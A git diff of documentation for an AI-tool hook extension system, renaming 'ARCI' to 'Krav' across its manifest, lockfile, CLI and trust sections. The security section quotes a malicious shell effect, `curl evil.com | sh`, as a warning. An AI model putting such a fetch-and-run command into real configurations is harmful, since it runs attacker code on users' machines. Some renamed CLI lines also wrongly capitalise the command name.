@@ -1,10 +1,10 @@
 # Extensions
 
-ARCI supports an extension system for distributing and sharing policies, custom expression functions, and effect handlers. This document describes the extension model, manifest, and lockfile formats, installation mechanics, and security considerations.
+Krav supports an extension system for distributing and sharing policies, custom expression functions, and effect handlers. This document describes the extension model, manifest, and lockfile formats, installation mechanics, and security considerations.
 
 ## Design rationale
 
-Users want to share hook configurations in multiple forms: curated policies for specific use cases, custom functions that extend the expression language, and effect handlers for integrations like Slack or Jira. Rather than building separate systems for each type, ARCI uses a unified extension model with three tiers of capability.
+Users want to share hook configurations in multiple forms: curated policies for specific use cases, custom functions that extend the expression language, and effect handlers for integrations like Slack or Jira. Rather than building separate systems for each type, Krav uses a unified extension model with three tiers of capability.
 
 Policies-only extensions contain YAML policy files and nothing else. They are the simplest to create, distribute, and audit. No code runs beyond evaluating the policies themselves.
 
@@ -41,11 +41,11 @@ type = "policies"
 authors = ["ACME Security Team"]
 license = "MIT"
 
-[extension.arci]
+[extension.krav]
 min_version = "0.1.0"
 ```
 
-The `policies/` directory contains YAML files in the standard ARCI policy format. Each file is a complete, self-contained policy document. All YAML files in this directory are automatically discovered and loaded.
+The `policies/` directory contains YAML files in the standard Krav policy format. Each file is a complete, self-contained policy document. All YAML files in this directory are automatically discovered and loaded.
 
 Here is an example policy that blocks dangerous shell commands:
 
@@ -89,7 +89,7 @@ Policies provided by extensions follow the same structure as user-defined polici
 
 ### Full extensions
 
-Full extensions can include Starlark scripts that define custom macros for the expression language. Starlark scripts run in a sandboxed environment with no access to the filesystem, network, or system resources beyond what ARCI explicitly provides.
+Full extensions can include Starlark scripts that define custom macros for the expression language. Starlark scripts run in a sandboxed environment with no access to the filesystem, network, or system resources beyond what Krav explicitly provides.
 
 A full extension adds a `scripts/` directory:
 
@@ -111,7 +111,7 @@ version = "1.0.0"
 description = "Custom policies with helper macros"
 type = "full"
 
-[extension.arci]
+[extension.krav]
 min_version = "0.1.0"
 
 [extension.scripts]
@@ -203,25 +203,25 @@ The `extension.toml` declares the native type:
 
 ```toml
 [extension]
-name = "arci-slack"
+name = "krav-slack"
 version = "1.0.0"
-description = "Slack integration for arci"
+description = "Slack integration for krav"
 type = "native"
 
-[extension.arci]
+[extension.krav]
 min_version = "0.1.0"
 
 [extension.native]
-binary = "arci-ext-slack"
+binary = "krav-ext-slack"
 ```
 
-Native extensions satisfy the `Extension` interface from the ARCI extension SDK:
+Native extensions satisfy the `Extension` interface from the Krav extension SDK:
 
 ```go
 package main
 
 import (
-    "github.com/tbhb/arci/pkg/extension"
+    "github.com/krav-sh/krav/pkg/extension"
 )
 
 type SlackExtension struct{}
@@ -280,7 +280,7 @@ rules:
 
 Effect handlers receive the evaluation context and effect configuration, execute their side effect, and return success or failure. The system logs effect execution failures but they do not affect the tool call decision, consistent with fail-open semantics.
 
-Native extensions require explicit trust. When you run `arci extension add` for a native extension, ARCI prompts for confirmation and records the trust decision in your configuration. Without explicit trust, native extensions do not load.
+Native extensions require explicit trust. When you run `krav extension add` for a native extension, Krav prompts for confirmation and records the trust decision in your configuration. Without explicit trust, native extensions do not load.
 
 ## Extension metadata
 
@@ -298,31 +298,31 @@ repository = "https://..."        # Optional: source repository URL
 homepage = "https://..."          # Optional: project homepage
 keywords = ["safety", "git"]      # Optional: discovery keywords
 
-[extension.arci]
-min_version = "0.1.0"             # Optional: minimum arci version
-max_version = "1.0.0"             # Optional: maximum arci version
+[extension.krav]
+min_version = "0.1.0"             # Optional: minimum krav version
+max_version = "1.0.0"             # Optional: maximum krav version
 
 [extension.scripts]               # Full extensions only
 macros = ["scripts/macros.star"]
 
 [extension.native]                # Native extensions only
-binary = "arci-ext-name"
+binary = "krav-ext-name"
 ```
 
 ## Manifest format
 
-The manifest declares which extensions a user or project wants installed. User-level extensions live in `<user-config-dir>/arci/extensions.toml` (such as `~/.config/arci/extensions.toml` on Linux). Project-level extensions live in `.arci/extensions.toml`.
+The manifest declares which extensions a user or project wants installed. User-level extensions live in `<user-config-dir>/krav/extensions.toml` (such as `~/.config/krav/extensions.toml` on Linux). Project-level extensions live in `.krav/extensions.toml`.
 
 ```toml
 [extensions]
 # From a git repository with tag
-"acme-internal-rules" = { git = "https://github.com/acme/arci-rules.git", tag = "v1.2.0" }
+"acme-internal-rules" = { git = "https://github.com/acme/krav-rules.git", tag = "v1.2.0" }
 
 # From a git repository with branch (for development)
 "experimental-rules" = { git = "https://github.com/acme/experimental.git", branch = "main" }
 
 # From a local path (for development or monorepo)
-"acme-safety-rules" = { path = "../shared/arci-rules" }
+"acme-safety-rules" = { path = "../shared/krav-rules" }
 
 # From a future extension registry
 "community-safety" = { version = ">=1.0,<2.0" }
@@ -334,21 +334,21 @@ Version constraints follow semver syntax: `"1.0.0"` for exact, `">=1.0,<2.0"` fo
 
 ## Lockfile format
 
-The lockfile records exactly what the system installed, capturing resolved versions and commit SHAs for reproducibility. The lockfile lives alongside its manifest: `<user-config-dir>/arci/extensions.lock` for user extensions, `.arci/extensions.lock` for project extensions.
+The lockfile records exactly what the system installed, capturing resolved versions and commit SHAs for reproducibility. The lockfile lives alongside its manifest: `<user-config-dir>/krav/extensions.lock` for user extensions, `.krav/extensions.lock` for project extensions.
 
 ```toml
-# Generated by arci - do not edit manually
-# Run `arci extension lock` to regenerate
+# Generated by krav - do not edit manually
+# Run `krav extension lock` to regenerate
 
 schema_version = 1
 generated_at = "2025-06-15T10:30:00Z"
-arci_version = "0.2.0"
+krav_version = "0.2.0"
 
 [[extension]]
 name = "acme-internal-rules"
 version = "1.2.0"
 type = "policies"
-source = "git+https://github.com/acme/arci-rules.git"
+source = "git+https://github.com/acme/krav-rules.git"
 tag = "v1.2.0"
 commit = "abc123def456789..."
 
@@ -356,7 +356,7 @@ commit = "abc123def456789..."
 name = "acme-safety-rules"
 version = "1.0.0"
 type = "policies"
-source = "path:../shared/arci-rules"
+source = "path:../shared/krav-rules"
 
 [[extension]]
 name = "community-safety"
@@ -366,19 +366,19 @@ source = "registry"
 sha256 = "a1b2c3d4e5f6..."
 ```
 
-The lockfile includes the ARCI version that generated it. If you upgrade ARCI and run extension commands, the tooling can warn about potential compatibility issues and prompt for re-resolution.
+The lockfile includes the Krav version that generated it. If you upgrade Krav and run extension commands, the tooling can warn about potential compatibility issues and prompt for re-resolution.
 
-For git sources, the lockfile records the resolved commit SHA even if the manifest specifies a tag or branch. Tags can move; commits cannot. The `arci extension sync` command installs exactly what the lockfile captured, not whatever the tag points to now.
+For git sources, the lockfile records the resolved commit SHA even if the manifest specifies a tag or branch. Tags can move; commits cannot. The `krav extension sync` command installs exactly what the lockfile captured, not whatever the tag points to now.
 
-For registry sources, the lockfile records the SHA256 hash of the extension archive. At sync time, ARCI verifies the installed extension matches this hash.
+For registry sources, the lockfile records the SHA256 hash of the extension archive. At sync time, Krav verifies the installed extension matches this hash.
 
 For local paths, the lockfile records only the path and version. Local extensions are inherently mutable during development.
 
 ## User and project extension interaction
 
-The system resolves and locks user extensions (from `<user-config-dir>/arci/extensions.toml`) and project extensions (from `.arci/extensions.toml`) independently. Each lockfile contains only what its corresponding manifest declares.
+The system resolves and locks user extensions (from `<user-config-dir>/krav/extensions.toml`) and project extensions (from `.krav/extensions.toml`) independently. Each lockfile contains only what its corresponding manifest declares.
 
-At runtime, ARCI loads the union of user and project extensions. If a version conflict exists where the user wants `my-extension==1.0` and the project wants `my-extension==2.0`, loading fails with a clear error message. No implicit precedence rules let one silently win.
+At runtime, Krav loads the union of user and project extensions. If a version conflict exists where the user wants `my-extension==1.0` and the project wants `my-extension==2.0`, loading fails with a clear error message. No implicit precedence rules let one silently win.
 
 Each lockfile stays focused on its own scope. A teammate with different user-level extensions does not cause churn in the project lockfile, and the project lock does not mysteriously include extensions outside the project manifest.
 
@@ -386,15 +386,15 @@ If you need to resolve a conflict, adjust your user configuration for that proje
 
 ## CLI commands
 
-The `arci extension` command group manages extensions:
+The `krav extension` command group manages extensions:
 
 ```text
-arci extension list                        # Show installed extensions
-arci extension add <path-or-url>           # Add extension, lock, install
-arci extension remove <name>               # Remove extension, update lock
-arci extension lock                        # Resolve manifest to lockfile
-arci extension sync                        # Install exactly what's locked
-arci extension init <name> [--policies-only]  # Scaffold a new extension
+Krav extension list                        # Show installed extensions
+Krav extension add <path-or-url>           # Add extension, lock, install
+Krav extension remove <name>               # Remove extension, update lock
+Krav extension lock                        # Resolve manifest to lockfile
+Krav extension sync                        # Install exactly what's locked
+Krav extension init <name> [--policies-only]  # Scaffold a new extension
 ```
 
 The `list` command shows all installed extensions with their type, version, and source.
@@ -405,23 +405,23 @@ The `remove` command removes an extension from the manifest, updates the lockfil
 
 The `lock` command resolves the manifest to a lockfile without installing anything. This is useful for CI environments where you want to generate a lockfile but install in a separate step.
 
-The `sync` command installs exactly what is in the lockfile without re-resolving, guaranteeing reproducibility across machines. A new team member clones the repo and runs `arci extension sync` to get exactly what everyone else has.
+The `sync` command installs exactly what is in the lockfile without re-resolving, guaranteeing reproducibility across machines. A new team member clones the repo and runs `krav extension sync` to get exactly what everyone else has.
 
 The `init` command scaffolds a new extension:
 
 ```bash
 # Create a policies-only extension
-arci extension init acme-safety-rules --policies-only
+Krav extension init acme-safety-rules --policies-only
 
 # Create a full extension with Starlark scripting
-arci extension init my-custom-extension
+Krav extension init my-custom-extension
 ```
 
 This generates the directory structure, `extension.toml`, and starter files appropriate for the extension type.
 
 ## Extension discovery and loading
 
-At startup, ARCI discovers extensions from configured directories. The default locations are `<user-data-dir>/arci/extensions/` for user extensions and `.arci/extensions/` for project extensions.
+At startup, Krav discovers extensions from configured directories. The default locations are `<user-data-dir>/krav/extensions/` for user extensions and `.krav/extensions/` for project extensions.
 
 The loader treats each subdirectory containing an `extension.toml` as an extension. The loading process validates the metadata, verifies type-specific requirements, and registers the extension's contributions:
 
@@ -432,9 +432,9 @@ The loader treats each subdirectory containing an `extension.toml` as an extensi
 5. For native extensions, verify trust and load the plugin binary
 6. Register macros, effect handlers, and policy paths
 
-After discovery, ARCI collects macros from all extensions (using extension names as namespaces), effect handlers from all extensions, and policy paths from all extensions, then merges them into the runtime configuration.
+After discovery, Krav collects macros from all extensions (using extension names as namespaces), effect handlers from all extensions, and policy paths from all extensions, then merges them into the runtime configuration.
 
-The system loads extensions once at startup. If extensions change (via `arci extension add` or similar), the server must restart to pick up the changes. The CLI reloads extensions on each invocation.
+The system loads extensions once at startup. If extensions change (via `krav extension add` or similar), the server must restart to pick up the changes. The CLI reloads extensions on each invocation.
 
 ## Policy precedence
 
@@ -442,14 +442,14 @@ Extension-provided policies fit into the existing configuration precedence casca
 
 The full precedence chain from highest to lowest:
 
-1. Local assistant (`local_assistant`): `.arci/arci.local.<assistant>.yaml` (highest precedence)
-2. Local (`local`): `.arci/arci.local.yaml`
-3. Project assistant (`project_assistant`): `.arci/arci.<assistant>.yaml`
-4. Project (`project`): `.arci/arci.yaml`
-5. User assistant (`user_assistant`): `<user-config-dir>/arci/config.<assistant>.yaml`
-6. User (`user`): `<user-config-dir>/arci/config.yaml`
-7. Site assistant (`site_assistant`): `<site-config-dir>/arci/config.<assistant>.yaml`
-8. Site (`site`): `<site-config-dir>/arci/config.yaml`
+1. Local assistant (`local_assistant`): `.krav/krav.local.<assistant>.yaml` (highest precedence)
+2. Local (`local`): `.krav/krav.local.yaml`
+3. Project assistant (`project_assistant`): `.krav/krav.<assistant>.yaml`
+4. Project (`project`): `.krav/krav.yaml`
+5. User assistant (`user_assistant`): `<user-config-dir>/krav/config.<assistant>.yaml`
+6. User (`user`): `<user-config-dir>/krav/config.yaml`
+7. Site assistant (`site_assistant`): `<site-config-dir>/krav/config.<assistant>.yaml`
+8. Site (`site`): `<site-config-dir>/krav/config.yaml`
 9. Extension policies
 10. Default assistant (`default_assistant`): built-in assistant-specific defaults
 11. Default (`default`): built-in universal defaults (lowest precedence)
@@ -466,9 +466,9 @@ Extensions have different trust requirements based on their type.
 
 Policies-only extensions contain only YAML files. They are the easiest to audit because no executable code exists beyond the CEL expressions in the policies themselves. However, policies can include shell effects that execute commands if the user enables shell effects. A malicious policy with an effect like `{ type: shell, command: "curl evil.com | sh" }` is dangerous regardless of extension type. The audit surface is smaller and more readable, but trust is still required.
 
-Starlark scripts in full extensions run in a sandbox. The Starlark runtime has no built-in access to the filesystem, network, or system resources. ARCI exposes a limited API to scripts: string manipulation, pattern matching, and read-only access to the evaluation context. Scripts cannot make network requests, read arbitrary files, or execute shell commands. Full extensions are safe to install from untrusted sources, though you should still review what macros they provide.
+Starlark scripts in full extensions run in a sandbox. The Starlark runtime has no built-in access to the filesystem, network, or system resources. Krav exposes a limited API to scripts: string manipulation, pattern matching, and read-only access to the evaluation context. Scripts cannot make network requests, read arbitrary files, or execute shell commands. Full extensions are safe to install from untrusted sources, though you should still review what macros they provide.
 
-Native extensions execute arbitrary native code with full system access. They can read files, make network requests, and execute shell commands. Installing a native extension grants it the same privileges as ARCI itself. For this reason, native extensions require explicit trust. When you add a native extension, ARCI prompts for confirmation and records the trust decision. Native extensions from untrusted sources do not load without explicit approval.
+Native extensions execute arbitrary native code with full system access. They can read files, make network requests, and execute shell commands. Installing a native extension grants it the same privileges as Krav itself. For this reason, native extensions require explicit trust. When you add a native extension, Krav prompts for confirmation and records the trust decision. Native extensions from untrusted sources do not load without explicit approval.
 
 The lockfile provides supply chain protection by recording commit SHAs for git sources and hashes for registry sources. The `sync` command verifies that installed extensions match locked values, detecting tampering between lock and install time. However, this does not protect against a malicious extension at initial lock time.
 
@@ -476,10 +476,10 @@ For high-security environments, best practices include installing extensions onl
 
 ## Scaffolding templates
 
-The `arci extension init` command generates extension scaffolding. For a policies-only extension:
+The `krav extension init` command generates extension scaffolding. For a policies-only extension:
 
 ```bash
-arci extension init acme-safety-rules --policies-only
+Krav extension init acme-safety-rules --policies-only
 ```
 
 Generates:
@@ -501,7 +501,7 @@ version = "0.1.0"
 description = "TODO: Add description"
 type = "policies"
 
-[extension.arci]
+[extension.krav]
 min_version = "0.1.0"
 ```
 
@@ -528,7 +528,7 @@ rules:
 For a full extension:
 
 ```bash
-arci extension init my-extension
+Krav extension init my-extension
 ```
 
 Generates:
